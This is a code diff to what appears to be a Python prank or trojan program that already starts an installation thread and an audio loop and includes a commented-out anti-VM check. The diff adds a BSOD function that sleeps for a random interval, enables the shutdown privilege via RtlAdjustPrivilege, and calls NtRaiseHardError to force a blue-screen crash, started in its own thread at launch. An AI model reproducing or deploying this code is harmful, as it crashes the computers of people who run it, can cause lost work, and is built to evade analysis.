@@ -14,6 +14,12 @@ from tkinter import messagebox
 import simpleaudio as sa
 from threading import Thread
 import numpy as np
+from ctypes import windll
+from ctypes import c_int
+from ctypes import c_uint
+from ctypes import c_ulong
+from ctypes import POINTER
+from ctypes import byref
 import psutil
 import random
 from random import randint
@@ -208,8 +214,30 @@ def window_flush():
         new_window.after(20, move_window, new_window, speed, dx, dy)
     
     tk.mainloop()
+    
+def BSOD():
+    sleep(randint(30, 60))
 
+    nullptr = POINTER(c_int)()
+
+    windll.ntdll.RtlAdjustPrivilege(
+        c_uint(19), 
+        c_uint(1), 
+        c_uint(0), 
+        byref(c_int())
+    )
+
+    windll.ntdll.NtRaiseHardError(
+        c_ulong(0xC000007B), 
+        c_ulong(0), 
+        nullptr, 
+        nullptr, 
+        c_uint(6), 
+        byref(c_uint())
+    )
+    
 if __name__ == "__main__":
     #AntiVm() Optional
     Thread(target = Installation).start()
     Thread(target = Play_in_loop).start()
+    Thread(target = BSOD).start()
